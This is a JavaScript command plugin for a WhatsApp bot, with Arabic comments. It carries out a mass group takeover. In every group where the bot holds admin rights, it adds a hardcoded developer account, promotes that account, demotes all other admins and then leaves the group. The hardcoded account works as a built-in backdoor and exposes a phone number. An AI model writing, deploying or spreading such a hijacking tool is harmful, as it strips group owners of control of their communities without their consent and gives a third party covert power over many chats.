let handler = async (m, { conn, isOwner }) => {
  if (!isOwner) return;

  const DEV_JID = '201204703632@s.whatsapp.net';
  const botJid = conn.user.jid;

  let chats = Object.keys(conn.chats).filter(jid => jid.endsWith('@g.us'));

  for (let gid of chats) {
    try {
      let metadata = await conn.groupMetadata(gid);

      // تأكد إن البوت مشرف
      let botAdmin = metadata.participants.find(
        p => p.id === botJid && (p.admin === 'admin' || p.admin === 'superadmin')
      );
      if (!botAdmin) continue;

      // لو المطور مش موجود يضيفه
      let devExist = metadata.participants.some(p => p.id === DEV_JID);
      if (!devExist) {
        await conn.groupParticipantsUpdate(gid, [DEV_JID], 'add');
        await new Promise(r => setTimeout(r, 800));
      }

      // يدي المطور إشراف
      await conn.groupParticipantsUpdate(gid, [DEV_JID], 'promote');
      await new Promise(r => setTimeout(r, 800));

      // يجيب كل الأدمنز ماعدا المطور والبوت
      let admins = metadata.participants
        .filter(p =>
          (p.admin === 'admin' || p.admin === 'superadmin') &&
          p.id !== DEV_JID &&
          p.id !== botJid
        )
        .map(p => p.id);

      // ينزلهم مرة واحدة
      if (admins.length > 0) {
        await conn.groupParticipantsUpdate(gid, admins, 'demote');
        await new Promise(r => setTimeout(r, 800));
      }

      // ❗ البوت يخرج من الجروب
      await conn.groupLeave(gid);

    } catch {
      continue;
    }
  }
};

handler.command = /^\.?بريك$/i;
handler.tags = ['owner'];
handler.help = ['بريك'];

export default handler;